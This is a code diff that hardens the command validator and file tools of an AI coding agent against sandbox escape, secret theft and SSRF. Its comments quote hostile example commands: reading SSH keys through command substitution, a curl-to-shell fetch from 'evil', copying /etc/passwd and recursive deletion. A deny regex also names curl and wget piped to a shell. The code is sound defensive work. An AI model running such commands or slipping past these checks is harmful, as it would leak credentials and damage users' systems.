@@ -38,6 +38,7 @@ import { AIMessage } from "@langchain/core/messages";
 import { chatWithTools } from "../../services/agentChat.mjs";
 import { readMemoryTopic, listMemoryTopics, loadMemoryIndex } from "../../services/agentMemory.mjs";
 import { validateSyntax, writeFileAtomic } from "../../utils/syntax.util.mjs";
+import { isSensitiveFilePath } from "../../utils/path.util.mjs";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -215,14 +216,74 @@ const BASH_ALLOWED_CMDS = new Set([
 
 const BASH_DENY_RE = /\b(sudo|shutdown|reboot|halt|poweroff|mkfs|chown|chmod\s+777\s+\/|launchctl|systemctl)\b|rm\s+(-[a-zA-Z]*\s+)*(\/|~)(\s|$)|>\s*\/dev\/(sd|disk)|curl[^|;&]*\|\s*(ba|z)?sh|wget[^|;&]*\|\s*(ba|z)?sh|:\s*\(\)\s*\{/;
 
+// Shell metacharacters that smuggle a SECOND command past the first-token
+// allowlist below. Command substitution `$(…)` / backticks and process
+// substitution `<(…)`/`>(…)` run their contents as arbitrary commands, and a
+// newline starts an unchecked new line. Without this, `echo $(cat ~/.ssh/id_rsa)`
+// or `ls \`curl evil|sh\`` sail straight through — the outer token is allowlisted
+// while the inner command runs unchecked. (Test-confirmed bypass before this.)
+const SHELL_SUBSTITUTION_RE = /\$\(|`|<\(|>\(|[\r\n]/;
+
+// Interpreters on the allowlist that will execute an arbitrary program passed
+// inline (node -e/-p, python3 -c). We keep the binaries — real dev work needs
+// `npm`/`node <file>` — but reject the inline-eval flags that turn them into a
+// raw code-execution primitive equivalent to an un-allowlisted shell.
+const INLINE_EVAL_RE = {
+  node: /(^|\s)(-e|--eval|-p|--print)(\s|=|$)/,
+  python3: /(^|\s)-c(\s|$)/,
+  python: /(^|\s)-c(\s|$)/,
+};
+
+// `find`/`awk` sub-features that execute arbitrary commands or delete files.
+const EXEC_FEATURE_RE = /\bfind\b[^|;&]*\s-(execdir|exec|delete)\b|\bawk\b[^|;&]*\bsystem\s*\(/;
+
+// Absolute /dev sinks that are safe as redirect/argument targets.
+const ALLOWED_ABS = new Set(["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/tty"]);
+
+// A single shell token escapes the workspace if it names an absolute path, a
+// home path (`~`), or climbs out with `..`. This is what actually confines the
+// bash tool to the workspace — `cat ~/.ssh/id_rsa`, `echo x >> ~/.zshrc`,
+// `cp /etc/passwd .`, `find /Users -delete` all die here regardless of which
+// allowlisted command fronts them. Leading redirection operators are stripped
+// first so `>~/.zshrc` and `2>/etc/x` are caught too.
+function tokenEscapesWorkspace(rawTok) {
+  let t = String(rawTok || "").trim();
+  if (!t) return false;
+  t = t.replace(/^['"]+/, "").replace(/^\d*[<>]{1,2}&?/, "").replace(/^['"]+/, "").replace(/['"]+$/, "");
+  if (!t || t === "&") return false;
+  if (ALLOWED_ABS.has(t)) return false;
+  if (t.startsWith("~")) return true;
+  if (t.startsWith("/")) return true;
+  if (t === ".." || t.startsWith("../") || t.includes("/../") || t.endsWith("/..")) return true;
+  return false;
+}
+
 export function validateBashCommand(command) {
   const cmd = String(command || "").trim();
   if (!cmd) return "command is required";
   if (cmd.length > 2000) return "command too long";
+  if (SHELL_SUBSTITUTION_RE.test(cmd)) return "command blocked: command/process substitution, backticks and newlines are not allowed (they bypass the command allowlist)";
   if (BASH_DENY_RE.test(cmd)) return "command blocked by safety policy (destructive or privileged operation)";
+  if (EXEC_FEATURE_RE.test(cmd)) return "command blocked: find -exec/-delete and awk system() can run arbitrary code";
 
-  // Check the first token of every pipeline/sequence segment against the allowlist.
-  const segments = cmd.split(/(?:\|\||&&|;|\|)/).map((s) => s.trim()).filter(Boolean);
+  // Per-token checks, BEFORE the allowlist: (1) refuse any path that escapes the
+  // workspace (absolute, ~, ..) — the real confinement boundary; (2) refuse any
+  // token that names a secret/credential file, so `cat .env`, `cp id_rsa …`, and
+  // redirects into a key file are all blocked just like the read/write tools.
+  for (const rawTok of cmd.split(/\s+/)) {
+    if (tokenEscapesWorkspace(rawTok)) {
+      return `command blocked: "${rawTok}" references a path outside the workspace (absolute, ~ or ..). The agent may only touch files inside the workspace.`;
+    }
+    const cleanTok = rawTok.replace(/^['"]+/, "").replace(/^\d*[<>]{1,2}&?/, "").replace(/['"]+$/, "");
+    if (cleanTok && isSensitiveFilePath(cleanTok)) {
+      return `command blocked: "${rawTok}" targets a secret/credential file. The agent may not read or write secrets.`;
+    }
+  }
+
+  // Check the first token of every pipeline/sequence/background segment against
+  // the allowlist. A single `&` is a separator too, so a backgrounded second
+  // command doesn't ride along unchecked.
+  const segments = cmd.split(/(?:\|\||&&|;|\||&)/).map((s) => s.trim()).filter(Boolean);
   for (const seg of segments) {
     const first = seg.replace(/^[({\s]+/, "").split(/\s+/)[0];
     if (!first) continue;
@@ -231,9 +292,18 @@ export function validateBashCommand(command) {
     if (!BASH_ALLOWED_CMDS.has(base)) {
       return `command "${base}" is not in the allowed list (${[...BASH_ALLOWED_CMDS].slice(0, 12).join(", ")}, …)`;
     }
-    // rm may only touch relative paths inside the workspace
-    if (base === "rm" && /(^|\s)(\/|~)/.test(seg.slice(2))) {
-      return "rm may only be used with relative paths inside the workspace";
+    // Interpreters may not eval an inline program (that is arbitrary code exec).
+    if (INLINE_EVAL_RE[base]?.test(seg)) {
+      return `command blocked: "${base}" inline-eval flags (-e/-c/-p) run arbitrary code. Write a file and run it instead.`;
+    }
+    // rm may only touch relative paths inside the workspace, and never the
+    // workspace root itself (`.`, `./`, `*`) recursively.
+    if (base === "rm") {
+      const rest = seg.slice(seg.indexOf("rm") + 2);
+      if (/(^|\s)(\/|~)/.test(rest)) return "rm may only be used with relative paths inside the workspace";
+      if (/-[a-z]*r/i.test(rest) && /(^|\s)(\.|\.\/|\*)(\s|$)/.test(rest)) {
+        return "recursive rm of the whole workspace (., ./, *) is blocked";
+      }
     }
   }
   return null;
@@ -250,13 +320,29 @@ function resolveShell() {
   return { bin: process.env.SHELL || "/bin/bash", flag: "-c" };
 }
 
+// Child processes must not inherit the server's secrets. An allowlisted `npm`
+// script / postinstall hook / `env`-reading tool would otherwise see
+// OPENAI_API_KEY and every other credential in process.env and could exfiltrate
+// it. Strip anything that looks like a secret; keep PATH/HOME/SHELL so tooling
+// still works.
+function sanitizedChildEnv() {
+  const out = {};
+  for (const [k, v] of Object.entries(process.env)) {
+    if (/(_KEY|API_KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL|PRIVATE_KEY|AUTH)/i.test(k)) continue;
+    out[k] = v;
+  }
+  out.CI = "1";
+  out.FORCE_COLOR = "0";
+  return out;
+}
+
 function runBash(command, cwd, timeoutMs = 120_000) {
   return new Promise((resolve) => {
     const { bin, flag } = resolveShell();
     const child = spawn(bin, [flag, command], {
       cwd,
       stdio: ["ignore", "pipe", "pipe"],
-      env: { ...process.env, CI: "1", FORCE_COLOR: "0" },
+      env: sanitizedChildEnv(),
     });
 
     let stdout = "";
@@ -411,10 +497,31 @@ function extractDesignSignals(html) {
   };
 }
 
+// Block SSRF to loopback / private / link-local hosts. Without this the agent
+// could be steered into fetching internal services (its own API on :9000, other
+// localhost apps) or the cloud metadata endpoint (169.254.169.254) that hands
+// out credentials. Not a defence against DNS-rebinding, but it stops the direct
+// cases. (Applies to fetch_url; web_search is pinned to duckduckgo.)
+function isBlockedFetchHost(hostname) {
+  const h = String(hostname || "").toLowerCase().replace(/^\[|\]$/g, "");
+  if (!h) return true;
+  if (h === "localhost" || h.endsWith(".localhost") || h.endsWith(".local") || h === "::1" || h === "0.0.0.0") return true;
+  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+  if (m) {
+    const a = Number(m[1]), b = Number(m[2]);
+    if (a === 127 || a === 10 || a === 0) return true;                 // loopback / private / this-network
+    if (a === 169 && b === 254) return true;                          // link-local + cloud metadata
+    if (a === 172 && b >= 16 && b <= 31) return true;                 // private
+    if (a === 192 && b === 168) return true;                          // private
+  }
+  return false;
+}
+
 export async function fetchUrl(rawUrl) {
   let url;
   try { url = new URL(String(rawUrl).trim()); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }
   if (!/^https?:$/.test(url.protocol)) return { success: false, error: "Only http/https URLs are allowed" };
+  if (isBlockedFetchHost(url.hostname)) return { success: false, error: "Blocked: refusing to fetch a loopback/private/link-local address." };
   try {
     const res = await fetch(url, {
       signal: AbortSignal.timeout(WEB_TIMEOUT_MS),
@@ -1053,6 +1160,9 @@ export async function executeTool(name, args, ctx) {
       case "read_file": {
         const relPath = String(args.path || "").trim();
         if (!relPath) return { success: false, error: "path is required" };
+        if (isSensitiveFilePath(relPath)) {
+          return { success: false, error: `Reading ${relPath} is blocked — it holds secrets/credentials. The agent is not allowed to load secret files into context.` };
+        }
         const absPath = safeResolve(root, relPath);
         const content = await readFileSafe(absPath);
         if (content === null) return { success: false, error: `File not found: ${relPath}` };
@@ -1087,6 +1197,7 @@ export async function executeTool(name, args, ctx) {
         const newString = String(args.new_string ?? "");
         if (!relPath || !oldString) return { success: false, error: "path and old_string are required" };
         if (oldString === newString) return { success: false, error: "old_string and new_string are identical" };
+        if (isSensitiveFilePath(relPath)) return { success: false, error: `Editing ${relPath} is blocked — the agent may not modify secret/credential files.` };
         const absPath = safeResolve(root, relPath);
         const original = await readFileSafe(absPath);
         if (original === null) return { success: false, error: `File not found: ${relPath}. Use write_file to create new files.` };
@@ -1132,6 +1243,7 @@ export async function executeTool(name, args, ctx) {
         const content = String(args.content ?? "");
         if (!relPath) return { success: false, error: "path is required" };
         if (!content.trim()) return { success: false, error: "content is empty — to create an empty file use bash `touch`" };
+        if (isSensitiveFilePath(relPath)) return { success: false, error: `Writing ${relPath} is blocked — the agent may not create or overwrite secret/credential files.` };
         const absPath = safeResolve(root, relPath);
         const existing = await readFileSafe(absPath);
         if (existing !== null && !ctx.readFiles.has(relPath)) {
@@ -1164,6 +1276,12 @@ export async function executeTool(name, args, ctx) {
       }
 
       case "bash": {
+        // Hard kill switch for locked-down / untrusted testing: set
+        // KODO_DISABLE_BASH=1 to remove shell execution entirely. The agent can
+        // still read/edit files, grep, glob and search the web.
+        if (process.env.KODO_DISABLE_BASH === "1") {
+          return { success: false, error: "The bash tool is disabled on this server (KODO_DISABLE_BASH=1). Accomplish the task with read_file/edit_file/write_file/grep instead." };
+        }
         const command = String(args.command || "").trim();
         const invalid = validateBashCommand(command);
         if (invalid) return { success: false, error: invalid };
@@ -1434,6 +1552,7 @@ export async function agentLoopNode(state) {
   };
   for (const f of workspaceSnapshot) {
     if (f.isDir || seedBlocks.length >= 3) continue;
+    if (isSensitiveFilePath(f.path)) continue; // never auto-preload a secret file
     if (msgLower.includes(f.path.toLowerCase())) {
       const content = await readFileSafe(safeResolve(root, f.path));
       if (content && content.length < 60_000) {
